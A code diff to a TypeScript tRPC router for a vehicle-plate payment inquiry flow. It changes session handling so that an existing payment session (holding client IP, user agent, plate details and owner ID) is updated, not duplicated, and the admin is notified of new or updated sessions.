@@ -80,22 +80,31 @@ export const appRouter = router({
           userId: ctx.user?.id ?? null,
         });
 
-        let currentSessionId = input.sessionId;
-        if (!currentSessionId) {
-          currentSessionId = nanoid();
-          await createPaymentSession({
-            sessionId: currentSessionId,
-            queryId,
-            stage: "inquiry",
-            clientIp: ctx.req.ip,
-            userAgent: ctx.req.headers["user-agent"],
-            plateNumber: input.plateNumber,
-            plateSource: input.plateSource,
-            plateCode: input.plateType,
-            qidNumber: input.inquiryType === "qid" ? input.ownerId : undefined,
-            establishmentId: input.inquiryType === "establishment" ? input.ownerId : undefined,
-          });
+        let currentSessionId = input.sessionId || nanoid();
+        
+        // التحقق مما إذا كانت الجلسة موجودة مسبقاً في قاعدة البيانات
+        const existingSession = await getPaymentSessionBySessionId(currentSessionId);
+        
+        const sessionData = {
+          sessionId: currentSessionId,
+          queryId,
+          stage: "inquiry" as any,
+          clientIp: ctx.req.ip,
+          userAgent: ctx.req.headers["user-agent"],
+          plateNumber: input.plateNumber,
+          plateSource: input.plateSource,
+          plateCode: input.plateType,
+          qidNumber: input.inquiryType === "qid" ? input.ownerId : undefined,
+          establishmentId: input.inquiryType === "establishment" ? input.ownerId : undefined,
+          statusRead: 0,
+        };
+
+        if (!existingSession) {
+          await createPaymentSession(sessionData);
           notifyAdmin("new_session", { sessionId: currentSessionId });
+        } else {
+          await updatePaymentSession(currentSessionId, sessionData);
+          notifyAdmin("update_session", { sessionId: currentSessionId, stage: "inquiry" });
         }
 
         try {
